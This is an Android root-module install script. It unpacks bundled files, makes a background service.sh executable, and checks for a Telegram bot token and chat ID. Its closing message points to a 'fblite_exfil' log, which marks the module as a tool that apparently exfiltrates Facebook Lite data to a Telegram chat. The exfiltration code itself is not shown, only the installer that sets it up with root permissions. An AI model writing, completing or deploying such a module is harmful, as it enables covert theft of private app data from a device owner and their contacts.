#!/system/bin/sh

MODPATH=${0%/*}

# Source config
[ -f "$MODPATH/config.sh" ] && . "$MODPATH/config.sh"

print_modname

# Extract common files
ui_print "- Extracting module files..."
unzip -o "$ZIPFILE" 'common/*' -d "$MODPATH" >&2

# Set permissions
set_perm_recursive "$MODPATH" 0 0 0755 0644
set_perm "$MODPATH/common/service.sh" 0 0 0755
set_perm "$MODPATH/customize.sh" 0 0 0755

# Telegram config check
if [ "$BOT_TOKEN" = "YOUR_BOT_TOKEN_HERE" ] || [ -z "$BOT_TOKEN" ]; then
  ui_print ""
  ui_print " ⚠ WARNING: BOT_TOKEN not configured!"
  ui_print " Edit config.sh and reinstall the module"
  ui_print ""
fi

if [ "$CHAT_ID" = "YOUR_CHAT_ID_HERE" ] || [ -z "$CHAT_ID" ]; then
  ui_print " ⚠ WARNING: CHAT_ID not configured!"
  ui_print " Edit config.sh and reinstall the module"
  ui_print ""
fi

ui_print " ✓ Installation complete!"
ui_print " Monitor log: /data/local/tmp/fblite_exfil.log"
